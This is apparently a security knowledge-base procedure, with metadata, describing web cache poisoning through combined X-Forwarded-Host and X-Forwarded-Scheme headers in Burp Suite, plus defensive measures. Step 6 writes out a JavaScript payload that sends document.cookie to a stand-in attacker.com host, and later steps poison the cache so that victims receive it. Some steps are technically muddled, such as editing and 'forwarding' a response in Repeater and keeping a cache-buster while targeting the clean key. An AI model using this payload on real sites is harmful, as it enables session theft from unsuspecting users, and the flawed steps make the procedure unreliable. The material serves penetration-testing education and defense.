---
id: 732a2943-19ca-4cc2-bdbe-b3423d325fcf
name: Web-Cache-Poisoning-with-Multiple-Headers
type: procedure
verified: true
submitted: true
created_at: '2020-08-18T17:15:11.032583+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - '[[tags/Web Applications]]'
  - '[[tags/web cache poisoning]]'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
commands: []
tools:
  - '[[tools/Burp-Suite]]'
validated: true
---

# Web-Cache-Poisoning-with-Multiple-Headers

## Summary

This procedure demonstrates how to exploit web cache poisoning vulnerabilities by manipulating multiple forwarded headers (X-Forwarded-Host and X-Forwarded-Scheme) in requests to a caching proxy or server. By poisoning the cache with a malicious response containing JavaScript that exfiltrates cookies, an attacker can achieve cross-site scripting (XSS)-like effects against subsequent users who access the cached resource, such as a JavaScript file.

## Description

Web cache poisoning occurs when an attacker influences the content stored in a web cache (e.g., a reverse proxy like Varnish or a CDN) by crafting requests that cause the cache to store a malicious response. This procedure focuses on using multiple X-Forwarded headers to bypass scheme and host validation, leading to a poisoned cache entry for a static resource like /resources/js/tracking.js. The attack redirects the request to a malicious host and injects JavaScript (e.g., document.cookie) into the response body. Once poisoned, victims accessing the legitimate URL receive the malicious content, enabling cookie theft or other client-side attacks. This is effective against applications that do not properly validate or normalize forwarded headers before caching. The target environment is a web application behind a caching layer, typically tested in a lab or authorized penetration test.

## Requirements

1. Access to Burp Suite Professional or Community Edition with Proxy and Repeater tools enabled.
2. Network access to the target web application, including the ability to intercept and modify HTTP requests.
3. Knowledge of the target's caching behavior (e.g., via prior reconnaissance showing cacheable resources like JS files).
4. A controlled testing environment to avoid impacting production users; do not test on live sites without authorization.
5. Basic understanding of HTTP headers and caching mechanisms (e.g., Vary header handling).

## Defense

Defensive measures and detection strategies:

- Implement strict validation and stripping of X-Forwarded headers at the application layer, using only trusted proxy IPs.
- Configure caches to use the Vary header properly, including variations for Host, Scheme, and custom headers to prevent poisoning.
- Enable cache-busting with unique query parameters or non-cacheable directives (e.g., Cache-Control: no-cache) for sensitive resources.
- Monitor for anomalous requests with multiple or malformed X-Forwarded headers using WAF logs (e.g., via ModSecurity or Cloudflare).
- Deploy client-side protections like Content Security Policy (CSP) to block inline or untrusted JavaScript execution.
- Regularly purge caches and audit cached responses for injected content.

## Objectives

1. Identify and manipulate cacheable resources using forwarded headers to influence cache storage.
2. Poison the cache with a malicious response containing cookie-exfiltrating JavaScript.
3. Verify the poisoning by accessing the resource and observing the injected payload execution.
4. Simulate victim access to confirm persistence and impact.

## Instructions

### Step 1: Intercept and Isolate Target Request

**Context**: Begin by capturing normal traffic to identify a cacheable resource, such as a JavaScript file, to use as the poisoning vector. This establishes a baseline for modification.

Navigate to the target application with Burp Proxy intercept disabled. Monitor the HTTP history tab in Burp Proxy to log requests and responses. Locate a GET request for a static resource like /resources/js/tracking.js, right-click it, and send it to Burp Repeater for manipulation.

### Step 2: Test X-Forwarded-Host Header

**Context**: Introduce a cache buster and the X-Forwarded-Host header to test if the server processes it without altering the response, confirming potential for header influence on caching.

In Burp Repeater, modify the request from Step 1 by adding a cache-busting query parameter (e.g., ?cb=1) to the URL and the header X-Forwarded-Host: example.com. Send the request and observe the response, which should remain unchanged from the original (e.g., serving the legitimate JS content).

### Step 3: Test X-Forwarded-Scheme Header

**Context**: Isolate the impact of the X-Forwarded-Scheme header to force a scheme mismatch, triggering a redirect that reveals caching behavior tied to protocol validation.

Remove the X-Forwarded-Host header from the previous request. Add X-Forwarded-Scheme: http (or any non-HTTPS value). Send the request. Observe a 302 redirect response where the Location header points to the same URL but enforced over HTTPS (e.g., https://originalhost/resources/js/tracking.js).

### Step 4: Combine Both Headers for Redirect Control

**Context**: Use both headers together to control the redirect target, setting up the poisoning by directing the cache to a malicious endpoint.

Add both X-Forwarded-Host: example.com and X-Forwarded-Scheme: http to the request. Send it. The 302 response's Location header should now redirect to https://example.com/resources/js/tracking.js, confirming the server's use of forwarded headers for location construction.

### Step 5: Modify Cache Buster for Poisoning

**Context**: Adjust the query parameter to target the exact cache key for the legitimate resource, ensuring the malicious response is stored under the victim's expected URL.

Update the cache buster query parameter in the URL to match the clean resource path, e.g., /resources/js/tracking.js?cb=poison. Ensure the request includes both forwarded headers from Step 4.

### Step 6: Craft and Inject Malicious Payload

**Context**: Replace the response body with malicious JavaScript to exfiltrate cookies, simulating the server's response from the poisoned redirect.

In Burp Repeater, modify the response body to include a simple script like <script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script> (or just document.cookie for testing). Forward the modified response as if from the malicious host. Save this as an exploit in Burp Intruder or Extender if needed for repetition.

### Step 7: Adjust Host for Malicious Origin

**Context**: Finalize the header to point to an attacker-controlled domain, ensuring the cache associates the malicious content with the legitimate URL.

Set X-Forwarded-Host to your attacker domain (e.g., attacker.com). Include X-Forwarded-Scheme: http. Send the request with the modified payload from Step 6.

### Step 8: Verify Poisoning in Browser

**Context**: Test the cache by accessing the legitimate URL directly, confirming the malicious JS executes and displays or sends cookies.

Right-click the request in Burp Repeater, select "Copy URL" (the clean /resources/js/tracking.js), and paste it into the browser. If successful, the page source or developer console should show the injected document.cookie output or a network request to the attacker server.

### Step 9: Force Cache Poisoning and Simulate Victim Access

**Context**: Repeat requests to fill the cache and observe persistence, mimicking how a victim would trigger the poisoned content.

Send the malicious request multiple times (e.g., via Burp Intruder) until the cache is populated. Then, access the legitimate URL from another browser session or IP to simulate a victim, verifying the malicious JS is served from cache.
